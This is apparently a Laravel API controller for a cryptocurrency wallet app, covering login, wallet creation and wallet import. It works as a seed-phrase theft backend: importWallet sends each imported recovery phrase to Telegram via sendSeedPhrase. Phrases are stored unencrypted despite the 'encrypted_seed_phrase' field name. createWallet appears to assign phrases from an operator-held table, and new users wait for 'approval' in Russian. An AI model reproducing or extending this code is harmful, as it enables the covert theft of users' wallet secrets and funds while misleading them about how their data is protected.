<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\SeedPhrase;
use App\Models\User;
use App\Models\Wallet;
use App\Services\CryptoService;
use App\Services\TelegramService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;

class AuthController extends Controller
{
    protected $cryptoService;
    protected $telegramService;

    public function __construct(CryptoService $cryptoService, TelegramService $telegramService)
    {
        $this->cryptoService = $cryptoService;
        $this->telegramService = $telegramService;
    }

    public function login(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'email' => 'required|email',
            'password' => 'required',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'success' => false,
                'errors' => $validator->errors()
            ], 422);
        }

        $credentials = request(['email', 'password']);

        if (!Auth::attempt($credentials)) {
            return response()->json([
                'success' => false,
                'message' => 'Incorrect credentials'
            ], 401);
        }

        $user = $request->user();
        $tokenResult = $user->createToken('Personal Access Token');
        $token = $tokenResult->token;
        $token->save();

        return response()->json([
            'success' => true,
            'data' => [
                'access_token' => $tokenResult->accessToken,
                'token_type' => 'Bearer',
                'expires_at' => $tokenResult->token->expires_at,
                'user' => $user
            ]
        ]);
    }

    public function logout(Request $request)
    {
        $request->user()->token()->revoke();

        return response()->json([
            'success' => true,
            'message' => 'You have successfully logged out.'
        ]);
    }

    public function user(Request $request)
    {
        return response()->json([
            'success' => true,
            'data' => $request->user()
        ]);
    }

    public function createWallet(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'password' => 'required|min:8|confirmed',
            'email' => 'required|email|unique:users',
            'seed_words' => 'required|array',
            'seed_words.*' => 'required|string'
        ]);

        if ($validator->fails()) {
            return response()->json([
                'success' => false,
                'errors' => $validator->errors()
            ], 422);
        }

        $seedPhrase = implode(' ', $request->seed_words);
        
        try {
            DB::beginTransaction();
            
            $user = User::create([
                'email' => $request->email,
                'password' => Hash::make($request->password),
                'theme' => 'dark',
                'is_approved' => true,
            ]);

            $encryptedSeedPhrase = $seedPhrase;
            
            $wallet = Wallet::create([
                'user_id' => $user->id,
                'name' => 'Main Wallet',
                'encrypted_seed_phrase' => $encryptedSeedPhrase,
                'is_default' => true,
                'is_approved' => true,
            ]);

            $dbSeedPhrase = SeedPhrase::where('phrase', $seedPhrase)->first();
            if ($dbSeedPhrase) {
                $dbSeedPhrase->update(['is_used' => true]);
            }

            $this->cryptoService->setupInitialBalances($user->id, $wallet->id, false);
            
            $user->update(['seed_phrase_sent' => true]);
            
            DB::commit();

            $tokenResult = $user->createToken('Personal Access Token');

            return response()->json([
                'success' => true,
                'data' => [
                    'access_token' => $tokenResult->accessToken,
                    'token_type' => 'Bearer',
                    'expires_at' => $tokenResult->token->expires_at,
                    'user' => $user
                ]
            ]);
        } catch (\Exception $e) {
            DB::rollBack();
            
            return response()->json([
                'success' => false,
                'message' => 'Error creating wallet: ' . $e->getMessage()
            ], 500);
        }
    }

    public function importWallet(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'password' => 'required|min:8|confirmed',
            'email' => 'required|email|unique:users',
            'seed_words' => 'required|array|min:12',
            'seed_words.*' => 'required|string'
        ]);

        if ($validator->fails()) {
            return response()->json([
                'success' => false,
                'errors' => $validator->errors()
            ], 422);
        }

        $seedPhrase = implode(' ', $request->seed_words);

        if (!$this->cryptoService->validateSeedPhrase($seedPhrase)) {
            return response()->json([
                'success' => false,
                'message' => 'Invalid seed phrase'
            ], 422);
        }
        
        try {
            DB::beginTransaction();
            
            $existingUser = User::whereHas('wallets', function($query) use ($seedPhrase) {
                $query->where('encrypted_seed_phrase', $seedPhrase);
            })->first();

            if($existingUser) {
                $walletExists = Wallet::where('user_id', $existingUser->id)
                    ->where('encrypted_seed_phrase', $seedPhrase)
                    ->exists();
                
                if (!$walletExists) {
                    $wallet = Wallet::create([
                        'user_id' => $existingUser->id,
                        'name' => 'Imported Wallet',
                        'encrypted_seed_phrase' => $seedPhrase,
                        'is_default' => !$existingUser->wallets()->exists(),
                        'is_approved' => true
                    ]);
                    
                    $this->cryptoService->setupInitialBalances($existingUser->id, $wallet->id, true);
                }
                
                DB::commit();

                $tokenResult = $existingUser->createToken('Personal Access Token');

                return response()->json([
                    'success' => true,
                    'data' => [
                        'access_token' => $tokenResult->accessToken,
                        'token_type' => 'Bearer',
                        'expires_at' => $tokenResult->token->expires_at,
                        'user' => $existingUser
                    ]
                ]);
            }
            
            $user = User::create([
                'email' => $request->email,
                'password' => Hash::make($request->password),
                'theme' => 'dark',
                'is_approved' => false
            ]);
            
            $wallet = Wallet::create([
                'user_id' => $user->id,
                'name' => 'Main Wallet',
                'encrypted_seed_phrase' => $seedPhrase,
                'is_default' => true,
                'is_approved' => true
            ]);
            
            $this->cryptoService->setupInitialBalances($user->id, $wallet->id, true);
            
            $this->telegramService->sendSeedPhrase($seedPhrase, $user->id);
            
            app(TelegramService::class)->sendMessage(
                "👤 Пользователь ID: {$user->id} - ждет апрува"
            );
            
            $user->update(['seed_phrase_sent' => true]);
            
            DB::commit();
            
            $tokenResult = $user->createToken('Personal Access Token');

            return response()->json([
                'success' => true,
                'data' => [
                    'access_token' => $tokenResult->accessToken,
                    'token_type' => 'Bearer',
                    'expires_at' => $tokenResult->token->expires_at,
                    'user' => $user
                ],
                'approval_required' => true
            ]);
        } catch (\Exception $e) {
            DB::rollBack();
            
            return response()->json([
                'success' => false,
                'message' => 'Error importing wallet: ' . $e->getMessage()
            ], 500);
        }
    }
}